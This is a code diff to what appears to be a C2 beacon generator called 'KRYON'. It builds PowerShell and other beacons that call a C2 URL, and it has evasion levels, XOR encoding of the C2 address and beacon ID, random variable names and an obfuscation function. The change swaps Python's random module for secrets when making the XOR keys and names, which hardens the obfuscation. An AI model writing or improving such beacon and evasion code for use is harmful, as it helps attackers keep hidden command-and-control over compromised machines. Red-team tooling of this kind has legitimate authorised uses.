@@ -193,7 +193,7 @@ while($true) {{
         }
 
         # XOR key for encryption
-        xor_key = random.randint(1, 255)
+        xor_key = secrets.randbelow(255) + 1
 
         code = f'''# KRYON Advanced PowerShell Beacon
 function {_random_var()} {{
@@ -274,7 +274,7 @@ while True:
 
     elif evasion in ["moderate", "advanced", "paranoid"]:
         # Obfuscated version
-        xor_key = random.randint(1, 255)
+        xor_key = secrets.randbelow(255) + 1
 
         c2_encoded = "".join([f"\\\\x{{ord(c) ^ {xor_key}:02x}}" for c in c2_url])
         id_encoded = "".join([f"\\\\x{{ord(c) ^ {xor_key}:02x}}" for c in beacon_id])
@@ -345,7 +345,7 @@ done
 
 def _random_var(length: int = 8) -> str:
     """Generate random variable name."""
-    return "".join(random.choices(string.ascii_letters, k=length))
+    return "".join(secrets.choice(string.ascii_letters) for _ in range(length))
 
 
 def _xor_string(text: str, key: int) -> str:
@@ -395,7 +395,7 @@ def obfuscate_beacon(beacon_code: str, method: str = "base64") -> dict[str, Any]
             results["code"] = encoded
 
         elif method == "xor":
-            key = random.randint(1, 255)
+            key = secrets.randbelow(255) + 1
             encoded = "".join([chr(ord(c) ^ key) for c in beacon_code])
             encoded_b64 = base64.b64encode(encoded.encode()).decode()
 
